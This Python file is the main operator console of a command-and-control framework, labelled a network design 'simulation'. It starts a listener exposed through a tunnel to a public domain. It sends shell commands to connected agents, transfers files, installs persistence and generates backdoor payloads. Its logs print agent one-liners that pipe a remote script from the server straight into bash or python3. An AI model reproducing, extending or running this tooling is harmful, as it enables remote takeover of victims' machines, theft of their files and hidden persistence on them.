#!/usr/bin/env python3
import os
import sys
import time
import atexit
import secrets
from datetime import datetime

try:
    import readline

    def completer(text, state):
        cmds = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "0"]
        matches = [c for c in cmds if c.startswith(text)]
        return matches[state] if state < len(matches) else None

    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")

    HISTFILE = os.path.join(os.path.dirname(__file__), ".c2_history")
    try:
        readline.read_history_file(HISTFILE)
    except FileNotFoundError:
        pass
    readline.set_history_length(500)
    atexit.register(lambda: readline.write_history_file(HISTFILE))
except ImportError:
    pass

from colorama import init, Fore, Style

from server.httpd import C2Server
from modules.shell import run_shell
from modules.file_transfer import upload_file, download_file
from modules.backdoor import backdoor_menu
from modules.persistence import install_persistence, remove_persistence
from modules.logger import LogBuffer, log_viewer

init(autoreset=True)

log_buffer = LogBuffer(max_size=2000)

BANNER = f"""{Fore.CYAN}
  ╔══════════════════════════════════════════╗
  ║         C2 v2 - Command & Control        ║
  ║     Network Design Project - Simulation   ║
  ╚══════════════════════════════════════════╝
{Style.RESET_ALL}"""


def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    formatted = f"{Fore.GREEN}[{ts}]{Style.RESET_ALL} {msg}"
    log_buffer.push(formatted)
    print(formatted)


def print_menu():
    print(f"\n{Fore.YELLOW}=== MAIN MENU ==={Style.RESET_ALL}")
    print(f"  {Fore.CYAN}1.{Style.RESET_ALL} Start listener")
    print(f"  {Fore.CYAN}2.{Style.RESET_ALL} Stop listener")
    print(f"  {Fore.CYAN}3.{Style.RESET_ALL} List agents")
    print(f"  {Fore.CYAN}4.{Style.RESET_ALL} Interact with agent")
    print(f"  {Fore.CYAN}5.{Style.RESET_ALL} Send shell command")
    print(f"  {Fore.CYAN}6.{Style.RESET_ALL} Upload file")
    print(f"  {Fore.CYAN}7.{Style.RESET_ALL} Download file")
    print(f"  {Fore.CYAN}8.{Style.RESET_ALL} Install persistence")
    print(f"  {Fore.CYAN}9.{Style.RESET_ALL} Remove persistence")
    print(f"  {Fore.CYAN}10.{Style.RESET_ALL} Generate backdoor payload")
    print(f"  {Fore.CYAN}11.{Style.RESET_ALL} Agent results")
    print(f"  {Fore.CYAN}12.{Style.RESET_ALL} View logs")
    print(f"  {Fore.CYAN}13.{Style.RESET_ALL} Show auth token")
    print(f"  {Fore.CYAN}0.{Style.RESET_ALL} Exit")
    print()


def select_agent(manager):
    agents = manager.list()
    if not agents:
        print(f"{Fore.RED}[!] No agents connected{Style.RESET_ALL}")
        return None
    print(f"\n{Fore.YELLOW}Connected agents:{Style.RESET_ALL}")
    for aid, info in agents.items():
        last = datetime.fromtimestamp(info["last_seen"]).strftime("%H:%M:%S")
        print(f"  {Fore.CYAN}{aid}{Style.RESET_ALL} | {info['hostname']} | {info['os']} | {info['ip']} | last: {last}")
    aid = input("\nAgent ID: ").strip()
    if aid in agents:
        return aid
    print(f"{Fore.RED}[!] Invalid agent ID{Style.RESET_ALL}")
    return None


PUBLIC_URL = "https://server.trazento.site"
SERVER_TOKEN = secrets.token_hex(8)

def main():
    print(BANNER)

    c2 = C2Server()
    c2.start(log_buffer=log_buffer, public_url=PUBLIC_URL, token=SERVER_TOKEN)
    log(f"[+] C2 server starting on 0.0.0.0:{c2.port}")
    log(f"[+] Cloudflare tunnel → {PUBLIC_URL} → localhost:{c2.port}")
    log(f"[+] Auth token: {Fore.YELLOW}{SERVER_TOKEN}{Style.RESET_ALL}")
    log(f"[+] Agent one-liner: curl -s {PUBLIC_URL}/sh | bash")
    log(f"[+] Agent one-liner: curl -s {PUBLIC_URL}/py | python3")

    while True:
        try:
            print_menu()
            choice = input(f"{Fore.YELLOW}C2>{Style.RESET_ALL} ").strip()

            if choice == "1":
                if not c2.running:
                    c2.start(log_buffer=log_buffer, token=SERVER_TOKEN)
                    log(f"[+] Listener started on 0.0.0.0:{c2.port}")
                else:
                    log("[!] Listener already running")

            elif choice == "2":
                if c2.running:
                    c2.stop()
                    log("[+] Listener stopped")
                else:
                    log("[!] Listener not running")

            elif choice == "3":
                agents = c2.manager.list()
                if not agents:
                    log("[!] No agents connected")
                else:
                    log(f"[+] {len(agents)} agent(s) connected:")
                    for aid, info in agents.items():
                        last = datetime.fromtimestamp(info["last_seen"]).strftime("%H:%M:%S")
                        log(f"  {aid} | {info['hostname']} | {info['os']} | {info['ip']} | last: {last}")

            elif choice == "4":
                aid = select_agent(c2.manager)
                if aid:
                    run_shell(c2.manager, aid, c2)

            elif choice == "5":
                aid = select_agent(c2.manager)
                if aid:
                    cmd = input("Command: ").strip()
                    if cmd:
                        tid = c2.manager.send_task(aid, "shell", {"command": cmd})
                        log(f"[+] Task {tid} sent to {aid}")
                        for _ in range(30):
                            time.sleep(1)
                            results = c2.manager.get_results(aid)
                            for r in results:
                                if r["task_id"] == tid:
                                    print(r["output"])
                                    break
                            else:
                                continue
                            break
                        else:
                            log("[!] Timeout waiting for result")

            elif choice == "6":
                aid = select_agent(c2.manager)
                if aid:
                    local = input("Local path: ").strip()
                    remote = input("Remote path: ").strip()
                    if local and remote:
                        upload_file(c2.manager, aid, local, remote)

            elif choice == "7":
                aid = select_agent(c2.manager)
                if aid:
                    remote = input("Remote path: ").strip()
                    local = input("Save as: ").strip()
                    if remote and local:
                        download_file(c2.manager, aid, remote, local)

            elif choice == "8":
                aid = select_agent(c2.manager)
                if aid:
                    install_persistence(c2.manager, aid)

            elif choice == "9":
                aid = select_agent(c2.manager)
                if aid:
                    remove_persistence(c2.manager, aid)

            elif choice == "10":
                backdoor_menu(PUBLIC_URL)

            elif choice == "11":
                aid = select_agent(c2.manager)
                if aid:
                    results = c2.manager.get_results(aid)
                    if not results:
                        log("[!] No results")
                    else:
                        for r in results:
                            log(f"[{r['status']}] {r['task_id']}: {r['output'][:200]}")

            elif choice == "12":
                log_viewer(log_buffer)

            elif choice == "13":
                log(f"Auth token: {Fore.YELLOW}{SERVER_TOKEN}{Style.RESET_ALL}")
                log(f"One-liner: curl -s {PUBLIC_URL}/sh | bash")

            elif choice == "0":
                log("[+] Shutting down...")
                c2.stop()
                sys.exit(0)

        except KeyboardInterrupt:
            print()
            log("[+] Shutting down...")
            c2.stop()
            sys.exit(0)


if __name__ == "__main__":
    main()
